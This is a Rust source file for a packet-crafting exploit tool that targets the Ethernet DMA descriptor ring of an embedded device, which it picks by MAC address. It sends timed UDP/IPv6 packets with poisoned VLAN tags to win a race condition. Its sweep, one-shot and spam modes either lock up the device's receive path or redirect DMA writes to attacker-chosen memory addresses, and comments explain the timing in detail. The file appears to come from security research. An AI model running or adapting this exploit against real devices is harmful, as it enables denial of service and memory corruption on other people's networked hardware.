use anyhow::{anyhow, bail, Context, Result};
use clap::{Parser, Subcommand, ValueEnum};
use log::{info, trace, warn};
use pnet::{
    datalink::{DataLinkReceiver, DataLinkSender},
    ipnetwork::IpNetwork,
    packet::{
        ethernet::{
            EtherType, EtherTypes, EthernetPacket, MutableEthernetPacket,
        },
        ip::{IpNextHeaderProtocol, IpNextHeaderProtocols},
        ipv6::{Ipv6Packet, MutableIpv6Packet},
        udp::{MutableUdpPacket, UdpPacket},
        vlan::{ClassOfService, MutableVlanPacket, VlanPacket},
        Packet,
    },
    util::MacAddr,
};
use std::{
    net::Ipv6Addr,
    str::FromStr,
    time::{Duration, Instant},
};

////////////////////////////////////////////////////////////////////////////////

const SOURCE_PORT: u16 = 2000;
const DEST_PORT: u16 = 7777;

/// Simple program to greet a person
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Ethernet interface to use
    #[arg(short, long)]
    iface: String,

    /// MAC address to target
    #[arg(long)]
    mac: String,

    /// Attack type
    #[arg(long, value_enum, default_value_t=AttackType::InvalidAddress)]
    attack: AttackType,

    #[clap(subcommand)]
    cmd: Command,
}

#[derive(Copy, Clone, Debug, ValueEnum)]
enum AttackType {
    /// Poison the descriptor with an invalid address
    ///
    /// This causes the Rx peripheral to stop entirely, which is easy to detect
    InvalidAddress,

    /// Poison the descriptor with a valid address
    ///
    /// This allows us to write the packet to an unexpected location
    WrongAddress,
}

#[derive(Debug, Subcommand)]
enum Command {
    /// Sweeps a particular attack across a range of values
    Sweep {
        /// Time offset at which to begin the sweep, in microseconds
        #[arg(long, allow_hyphen_values(true), default_value_t = -2000)]
        start: i64,
        /// Time offset at which to end the sweep, in microseconds
        #[arg(long, allow_hyphen_values(true), default_value_t = 2000)]
        end: i64,
    },
    /// Send a single VID-poisoning packet with a specific delay
    One {
        /// Time offset, in microseconds
        #[arg(long, allow_hyphen_values(true))]
        delay: i64,
    },
    /// Send a constant stream of VID-poisoning packets with a specific delay
    Spam {
        /// Time offset, in microseconds
        #[arg(long, allow_hyphen_values(true))]
        delay: i64,
    },
}

fn main() -> Result<()> {
    env_logger::Builder::from_env(
        env_logger::Env::default().default_filter_or("info"),
    )
    .init();

    // Open a bogus socket to listen on port 2000, which prevents the OS from
    // replying with ICMPv6 messages about the port being unreachable.
    let _socket = std::net::UdpSocket::bind(format!("[::]:{SOURCE_PORT}"))?;

    let args = Args::parse();
    let dest_mac = MacAddr::from_str(&args.mac)
        .with_context(|| format!("failed to parse '{}'", args.mac))?;
    let dest_ip = mac_to_ipv6(dest_mac);
    info!("target MAC address:  {dest_mac:?}");
    info!("target IPv6 address: {dest_ip:?}");

    let interfaces = pnet::datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface| iface.name == args.iface)
        .ok_or_else(|| anyhow!("could not find interface '{}'", args.iface))?;
    let source_mac = interface.mac.unwrap();
    let source_ip = interface
        .ips
        .iter()
        .find_map(|i| match i {
            IpNetwork::V6(ip) => Some(ip.ip()),
            _ => None,
        })
        .ok_or_else(|| anyhow!("could not get IPv6 address from interface"))?;

    let cfg = pnet::datalink::Config {
        read_timeout: Some(Duration::from_millis(100)),
        ..Default::default()
    };
    let (sender, receiver) = match pnet::datalink::channel(&interface, cfg)? {
        pnet::datalink::Channel::Ethernet(tx, rx) => (tx, rx),
        _ => bail!("Unknown channel type"),
    };

    let builder = Builder {
        source_ip,
        source_mac,
        dest_ip,
        dest_mac,
    };

    let mut worker = Worker {
        builder,
        sender,
        receiver,
    };

    // Send a friendly packet to ensure that we're in the target's NDP tables
    info!("sending initial packet to populate NDP tables");
    if !worker.check_alive() {
        bail!("could not send initial packet; is the target already locked up?")
    }
    info!("received reply from hello packet");

    match args.cmd {
        Command::Sweep { start, end } => {
            if end <= start {
                bail!("end must be greater than start");
            }

            let mut n = 0;
            'outer: loop {
                for delay in start..end {
                    n += 1;
                    if n % 1000 == 0 {
                        info!("sent {n} attacks");
                    }
                    if let Err(e) = worker.run_one(delay, args.attack) {
                        warn!("ignoring error {e}");
                        continue;
                    }
                    // Add a brief delay, so that we're sure this packet doesn't
                    // interfere with the attack sequence.
                    if matches!(args.attack, AttackType::InvalidAddress) {
                        std::thread::sleep(Duration::from_millis(10));
                        if !worker.check_alive() {
                            info!("killed with delay {delay}");
                            println!(
                                "locked up system with {delay} after {n} attacks"
                            );
                            break 'outer;
                        }
                    }
                }
            }
        }
        Command::One { delay } => {
            worker.run_one(delay, args.attack)?;
        }
        Command::Spam { delay } => loop {
            worker.run_one(delay, args.attack)?;
        },
    }

    Ok(())
}

struct Worker {
    builder: Builder,
    sender: Box<dyn DataLinkSender>,
    receiver: Box<dyn DataLinkReceiver>,
}

impl Worker {
    fn udp_packet(&self, data: &[u8]) -> EthernetPacket<'static> {
        let (udp, payload_len, tag) = self.builder.udp(data);
        let (ipv6, ethertype) = self.builder.ipv6(udp, payload_len, tag);
        self.builder.eth(ipv6, ethertype)
    }

    fn hello_packet(&self) -> EthernetPacket<'static> {
        self.udp_packet(&[0])
    }

    fn delay_packet(&self) -> EthernetPacket<'static> {
        self.udp_packet(&[b'1'])
    }

    /// Checks whether the target is still alive
    ///
    /// Returns `true` if it replies, `false` otherwise
    fn check_alive(&mut self) -> bool {
        self.sender.send_to(self.hello_packet().packet(), None);
        self.receive_udp(Duration::from_millis(100)).is_some()
    }

    fn u16_to_vlan(
        &self,
        data: impl Packet,
        ethertype: EtherType,
        addr: u16,
    ) -> (VlanPacket, EtherType) {
        let priority = (addr >> 13) as u8;
        let dei = ((addr >> 12) & 1) as u8;
        let vid = addr & 0xFFF;

        let mut vlan = MutableVlanPacket::owned(vec![
            0u8;
            MutableVlanPacket::minimum_packet_size()
                + data.packet().len()
        ])
        .unwrap();

        vlan.set_ethertype(ethertype);
        vlan.set_vlan_identifier(vid);
        vlan.set_priority_code_point(ClassOfService::new(priority));
        vlan.set_drop_eligible_indicator(dei);
        vlan.set_payload(data.packet());
        (vlan.consume_to_immutable(), EtherTypes::Vlan)
    }

    fn addr_to_vlan(
        &self,
        data: impl Packet,
        ethertype: EtherType,
        addr: u32,
    ) -> (VlanPacket, EtherType) {
        let (vlan, ethertype) =
            self.u16_to_vlan(data, ethertype, (addr >> 16) as u16);
        self.u16_to_vlan(vlan, ethertype, addr as u16)
    }

    /// Sends a single attack with a particular timing delay
    fn run_one(&mut self, delay_micros: i64, attack: AttackType) -> Result<()> {
        // Build our attack packets with a either a single VLAN header
        // (triggering a bad DMA write) or nested VLAN headers (poisoning the
        // descriptor to write to an arbitrary address).
        let mut poison_packets = vec![];
        for i in 0..4 {
            // Build a padded packet which is long enough to be discarded by the
            // target, to keep things simple.  The size matters, because it
            // determines how long user code takes to process the packet.
            let mut data: Vec<u8> = format!("data-{i}-").as_bytes().to_vec();
            for i in 0..16 {
                data.push(b'0' + i % 10);
            }

            // Build the rest of the poison packet
            let (udp, payload_len, tag) = self.builder.udp(&data);
            let (ipv6, ethertype) = self.builder.ipv6(udp, payload_len, tag);

            let eth = match attack {
                AttackType::InvalidAddress => {
                    // This will poison the descriptor to an invalid address of
                    // 0x301, which will cause Rx to stop.
                    let (vlan, ethertype) =
                        self.builder.vlan(0x301 + i, ipv6, ethertype);
                    self.builder.eth(vlan, ethertype)
                }
                AttackType::WrongAddress => {
                    // Build a nested VLAN packet that decodes to the given
                    // address This should poison the descriptor with a valid
                    // address, so the DMA peripheral will copy to that address
                    // instead of failing
                    let (vlan, ethertype) = self.addr_to_vlan(
                        ipv6,
                        ethertype,
                        0x30010000 + i as u32 * 0x100,
                    );
                    self.builder.eth(vlan, ethertype)
                }
            };

            poison_packets.push(eth);
        }

        // The contents of the attack packet don't matter, but its size does,
        // because that determines how long the DMA peripheral takes to copy it.
        //
        // We use a characteristic string so that we can find it in RAM.
        let mut attack_packets = vec![];
        for i in 0..4 {
            let mut data: Vec<u8> = format!("attack-{i}-").as_bytes().to_vec();
            for i in 0..16 {
                data.push(b'0' + i % 10);
            }
            attack_packets.push(self.udp_packet(&data));
        }

        trace!("sending attack sequence with delay {delay_micros}");

        // This triggers a 20 ms busywait
        let send_start = Instant::now();
        self.sender.send_to(self.delay_packet().packet(), None);
        let send_end = Instant::now();
        let send_time = send_start + (send_end - send_start) / 2;
        let mut end_time = send_time + Duration::from_millis(20);
        if delay_micros > 0 {
            end_time += Duration::from_micros(delay_micros as u64);
        } else {
            end_time -= Duration::from_micros(-delay_micros as u64);
        }

        // Brief pause to make sure that the busy-wait happened
        std::thread::sleep(Duration::from_millis(10));

        // Send four poison packets to put the ring in a known state (with
        // values in the RDES0 position) while the busy-wait happens.
        for p in poison_packets {
            self.sender.send_to(p.packet(), None);
        }

        //  At this point, the descriptor ring should look like the following:
        // -0------1------2------3------
        // | user | user | user | user |
        // -----------------------------
        // ^ user position
        // ^ dma position (in "suspended" state)
        //
        // The incoming packets have the following VIDs (in descriptor word 0)
        // -0------1------2------3------
        // | 301  | 302  | 303  | 304  | (hex values)
        // -----------------------------

        // Sleep until the busy-wait ends, with a user-provided offset to modify
        // the time, compensating for network and turnaround time.
        let sleep_amount = end_time.saturating_duration_since(Instant::now());
        std::thread::sleep(sleep_amount);

        // Remember, at this point, our descriptor ring looks like this:
        //
        // -0------1------2------3-----
        // | user | user | user | user |
        // ----------------------------
        // ^ user position
        // ^ dma position (in "suspended" state)
        //
        // When user code exits the busy-wait, it will begin processing packet 0
        // and then poke the tail pointer to restart the peripheral.
        //
        // -0------1------2------3-----
        // | dma  | user | user | user |
        // ----------------------------
        //        ^ user position
        // ^ dma position (in "waiting for packet" state)
        //
        // We now enter the danger zone!
        //
        // We want the DMA peripheral to finish storing an incoming packet
        // (packet 5) into slot 0 at the exact same time as the user code
        // releases descriptor 1 in the ring.  This means that we have a window
        // where the DMA peripheral can read descriptor 1 in the ring at the
        // same time as user code writes it, triggering our bug.
        //
        // If packet 5 arrives too early, it will get written to descriptor 0
        // and when processing the packet 1, we'll notice that the DMA
        // peripheral has turned itself off (in ETH_DMADSR):
        //
        //  -0------1------2------3------
        //  | user | user | user | user |  DMA writes attack packet to slot 0
        //  -----------------------------
        //         ^ user position
        //         ^ dma position (suspended)
        //
        //  -0------1------2------3------
        //  | user | dma  | user | user |  User code processes slot 1
        //  -----------------------------
        //                ^ user position
        //         ^ dma position (waiting for packet)
        //
        // If the packet arrives too late, when processing the first user
        // packet, DMA will still be waiting:
        //
        //  -0------1------2------3------
        //  | dma  | dma  | user | user |  user code processes slot 1
        //  -----------------------------
        //                ^ user position
        //  ^ dma position ("waiting for packet")
        //
        //  -0------1------2------3------
        //  | user | dma  | user | user | DMA writes attack packet to slot 0
        //  -----------------------------
        //                ^ user position
        //         ^ dma position ("waiting for packet")
        //
        // To help narrow down the timing window, we can track the Rx channel
        // state in ETH_DMADSR, and notice when we start seeing "suspended"
        // readings. (This requires a modified firmware to accumulate those
        // statistics)
        //
        // In practice, we actually send a four-packet burst, which increases
        // the odds of hitting any of the poisoned descriptors.  Oddly, sending
        // only one packet doesn't work at all; perhaps there's a buffer or
        // queue somewhere in the system which doesn't flush?
        //
        // (or possibly writing the tail pointer, i.e. sending a Receive Poll
        // Demand, causes the DMA peripheral to re-read the descriptor?)

        for a in attack_packets {
            self.sender.send_to(a.packet(), None);
            // If we successfully poisoned the descriptor, then the DMA
            // peripheral is waiting to write to an incorrect address!
            //
            // It may write one of the packets in this attack burst to that
            // address, or a later packet (e.g. ambient network traffic or our
            // check-alive ping).
        }

        // Receive the initial reply, from the delay packet initially.
        if let Some((reply, _reply_time)) =
            self.receive_udp(Duration::from_millis(10))
        {
            assert_eq!(reply, vec![b'1']);
        } else {
            bail!("failed to receive initial reply");
        }
        Ok(())
    }

    /// Receives a single UDP packet
    ///
    /// Returns the packet data and arrival time on success, or `None` on timeout
    fn receive_udp(&mut self, timeout: Duration) -> Option<(Vec<u8>, Instant)> {
        let start = Instant::now();
        while Instant::now() - start < timeout {
            let Ok(rx) = self.receiver.next() else {
            continue;
        };
            let rx_time = Instant::now();
            let packet = EthernetPacket::new(rx).unwrap();
            if EtherTypes::Ipv6 == packet.get_ethertype() {
                let header = Ipv6Packet::new(packet.payload()).unwrap();
                if IpNextHeaderProtocols::Udp == header.get_next_header() {
                    let udp = UdpPacket::new(header.payload()).unwrap();
                    if udp.get_destination() == SOURCE_PORT {
                        return Some((udp.payload().to_owned(), rx_time));
                    }
                }
            }
        }
        None
    }
}

/// Convert a MAC address to a link-local IPv6 address
fn mac_to_ipv6(mut mac: MacAddr) -> Ipv6Addr {
    mac.0 ^= 2;
    Ipv6Addr::new(
        0xfe80,
        0,
        0,
        0,
        u16::from_be_bytes([mac.0, mac.1]),
        u16::from_be_bytes([mac.2, 0xff]),
        u16::from_be_bytes([0xfe, mac.3]),
        u16::from_be_bytes([mac.4, mac.5]),
    )
}

/// Helper class to build relevant packets without too much boilerplate
struct Builder {
    source_ip: Ipv6Addr,
    dest_ip: Ipv6Addr,
    source_mac: MacAddr,
    dest_mac: MacAddr,
}

impl Builder {
    fn udp(
        &self,
        data: &[u8],
    ) -> (UdpPacket<'static>, u16, IpNextHeaderProtocol) {
        let payload_len: u16 =
            (data.len() + 8).try_into().expect("packet size overflow");

        // Build from the bottom up, so that each buffer is exactly the right size
        let mut udp =
            MutableUdpPacket::owned(vec![0u8; payload_len as usize]).unwrap();
        udp.set_source(SOURCE_PORT);
        udp.set_destination(DEST_PORT); // our target port
        udp.set_payload(data);
        udp.set_length(payload_len); // UDP header length
        let udp_chk = pnet::packet::udp::ipv6_checksum(
            &udp.to_immutable(),
            &self.source_ip,
            &self.dest_ip,
        );
        udp.set_checksum(udp_chk);
        (
            udp.consume_to_immutable(),
            payload_len,
            IpNextHeaderProtocols::Udp,
        )
    }

    fn ipv6<P: Packet>(
        &self,
        data: P,
        payload_len: u16,
        next_header: IpNextHeaderProtocol,
    ) -> (Ipv6Packet<'static>, EtherType) {
        let mut ipv6 = MutableIpv6Packet::owned(vec![
            0u8;
            Ipv6Packet::minimum_packet_size()
                + data.packet().len()
        ])
        .unwrap();

        ipv6.set_version(6);
        ipv6.set_hop_limit(64);
        ipv6.set_next_header(next_header);
        ipv6.set_destination(self.dest_ip);
        ipv6.set_source(self.source_ip);
        ipv6.set_payload_length(payload_len);
        ipv6.set_payload(data.packet());

        (ipv6.consume_to_immutable(), EtherTypes::Ipv6)
    }

    fn vlan<P: Packet>(
        &self,
        vid: u16,
        data: P,
        tag: EtherType,
    ) -> (VlanPacket<'static>, EtherType) {
        let mut vlan = MutableVlanPacket::owned(vec![
            0u8;
            MutableVlanPacket::minimum_packet_size()
                + data.packet().len()
        ])
        .unwrap();

        vlan.set_ethertype(tag);
        vlan.set_vlan_identifier(vid);
        vlan.set_payload(data.packet());
        (vlan.consume_to_immutable(), EtherTypes::Vlan)
    }

    fn eth<P: Packet>(
        &self,
        data: P,
        tag: EtherType,
    ) -> EthernetPacket<'static> {
        let mut eth =
            MutableEthernetPacket::owned(vec![
                0u8;
                EthernetPacket::minimum_packet_size()
                    + data.packet().len()
            ])
            .unwrap();
        eth.set_destination(self.dest_mac);
        eth.set_source(self.source_mac);
        eth.set_ethertype(tag);
        eth.set_payload(data.packet());
        eth.consume_to_immutable()
    }
}
